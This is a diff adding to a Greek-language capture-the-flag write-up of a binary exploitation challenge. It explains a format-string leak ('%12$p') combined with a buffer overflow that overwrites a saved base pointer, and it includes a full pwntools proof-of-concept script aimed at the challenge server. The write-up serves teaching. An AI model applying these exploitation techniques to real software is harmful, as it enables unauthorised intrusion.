@@ -52,7 +52,57 @@
 ![image](https://github.com/Babafaba/NTUA_H4CK_crypto_challs/assets/56980206/b4ef78e0-4a2f-44a7-8e45-7c37edb837ba)\
 Η τιμή δηλαδή που συγκρίνεται με το `secret_number` είναι η τιμή που περιέχεται στη θέση μνήμης `rbp-0x8`, αυτή τη φορά όμως ο rbp είναι ο base pointer της συνάρτησης `game()`.\
 \
-Με άλλα λόγια τα offsets είναι ίδια ανάμεσα στις δύο μεταβλητές που συγκρίνει το πρόγραμμα. Αρκεί, λοιπόν, να κάνουμε overwrite την τιμή του rbp της συνάρτησης `opinion()`, με την τιμή του rbp της συνάρτησης `main()` (την οποία γνωρίζουμε εξαιτίας του leak).
+Με άλλα λόγια τα offsets είναι ίδια ανάμεσα στις δύο μεταβλητές που συγκρίνει το πρόγραμμα. Αρκεί, λοιπόν, να κάνουμε overwrite την τιμή του rbp της συνάρτησης `opinion()`, με την τιμή του rbp της συνάρτησης `main()` (την οποία γνωρίζουμε εξαιτίας του leak). Έτσι, κατά το return της `opinion()`, ο rbp θα λάβει την τιμή του rbp της `main()` και όταν έρθει η ώρα της σύγκρισης, το `rbp-0x8` θα περιέχει τη διεύθυνση μνήμης της `main()` που είναι αποθηκευμένο το `secret_number` αντί για τη διεύθυνση της μνήμης που περιέχει τη μαντεψιά-νούμερο που δίνει ως είσοδο ο χρήστης. Ακολούθως, ο έλεγχος θα είναι επιτυχής και θα λάβουμε στο `stdout` το πολυπόθητο **flag**.\
+\
+Συνοψίζοντας:
+* Κατά την πρώτη προσπάθεια, δίνουμε ως είσοδο για τον αριθμό το string `%12$p` και διαβάζουμε το memory leak που μας επιστρέφει το binary
+* Κατά τη δεύτερη προσπάθεια, κάνουμε overflow τον buffer της `opinion()` έτσι ώστε να κάνουμε overwrite τον rbp με την τιμή που λάβαμε προηγουμένως (αναφερόμαστε στο leak)
+* Το flag τυπώνεται επιτέλους στο τερματικό μας καθώς εκτελείται η `win()`
+
+# POC:
+Για το exploitation, μπορεί να χρησιμοποιηθεί το ακόλουθο script σε Python:
+```Python
+#N0_Sp3c14l_Ch4r
+
+from pwn import *
+
+#Connect to remote server
+r = remote('0.cloud.chals.io', 21341)
+
+#First payload, exploiting the format string vulnerability
+payload1 = b'%12$p'
+
+#Interacting with the binary (not important, you can add your own strings)
+r.sendlineafter(b'name: ', b'Chagi')
+r.sendlineafter(b'number: ', payload1)
+r.sendlineafter(b'here: ', b'kek')
+
+#Reading the memory leak
+r.recvuntil(b'your guess')
+
+r.recvline()
+leak = int(r.recvline().strip().decode(), 16)
+print(leak)
+print(hex(leak))
+
+#Second payload, exploiting the buffer overflow and overwriting the rbp
+payload2 = b'A'*64 + p64(leak)
+
+#Interacting with the binary for the second time (again you can change the '1337' string)
+r.sendlineafter(b'number: ', b'1337')
+
+#Triggering the BOF
+r.sendlineafter(b'here: ', payload2)
+
+#Flag on the terminal!!
+r.interactive()
+
+#PWNED
+```
+\
+Εκτελώντας το παραπάνω, λαμβάνουμε ως έξοδο:\
+![image](https://github.com/Babafaba/NTUA_H4CK_crypto_challs/assets/56980206/cec1a2ba-d1d6-4f6b-93ce-c3bef19f51fc)
+
 
 
 
